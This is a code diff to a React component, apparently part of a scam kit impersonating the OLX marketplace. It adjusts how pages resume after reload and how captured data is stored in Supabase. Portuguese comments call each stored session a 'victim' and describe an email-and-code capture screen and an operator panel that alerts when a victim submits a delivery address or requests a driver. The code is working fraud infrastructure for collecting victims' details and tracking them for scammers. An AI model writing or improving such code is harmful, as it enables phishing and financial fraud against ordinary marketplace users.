@@ -313,6 +313,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       const dispatched = row?.driver_dispatched_at || null;
       if (dispatched && dispatched !== lastDispatched) {
         lastDispatched = dispatched;
+        try { localStorage.setItem(`olx_resume_${adId}`, "1"); } catch { /* ignore */ }
         iframeRef.current?.contentWindow?.postMessage(
           {
             type: "olx-driver-dispatched",
@@ -332,6 +333,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
         );
       } else if (!dispatched && lastDispatched) {
         lastDispatched = null;
+        try { localStorage.removeItem(`olx_resume_${adId}`); } catch { /* ignore */ }
         iframeRef.current?.contentWindow?.postMessage({ type: "olx-driver-reset" }, "*");
       }
     };
@@ -629,7 +631,10 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
               .maybeSingle();
             const row = data as any;
             if (!row) return;
-            if (row.delivery_address || row.driver_requested_at || row.driver_dispatched_at) {
+            // Só "trava" na tela final depois que o dono despachou o motorista.
+            // Antes disso (só endereço, ou só pediu motorista), o reload deve
+            // seguir o fluxo normal (volta pra tela de e-mail+código).
+            if (row.driver_dispatched_at) {
               try { localStorage.setItem(`olx_resume_${adId}`, "1"); } catch { /* ignore */ }
               if (currentScreenKindRef.current === "main") {
                 await navigateToManualScreen("verification-success");
@@ -750,7 +755,6 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       // Vai pra ad_session_orders (uma linha por sessão/vítima).
       if (data.type === "iframe-save-delivery-address" && adId && data.address) {
         const sessionId = getSessionId();
-        try { localStorage.setItem(`olx_resume_${adId}`, "1"); } catch { /* ignore */ }
         supabase
           .from("ad_session_orders" as any)
           .upsert({
@@ -768,7 +772,6 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       // O painel detecta via realtime e dispara alerta sonoro/notificação.
       if (data.type === "iframe-request-driver" && adId) {
         const sessionId = getSessionId();
-        try { localStorage.setItem(`olx_resume_${adId}`, "1"); } catch { /* ignore */ }
         supabase
           .from("ad_session_orders" as any)
           .upsert({
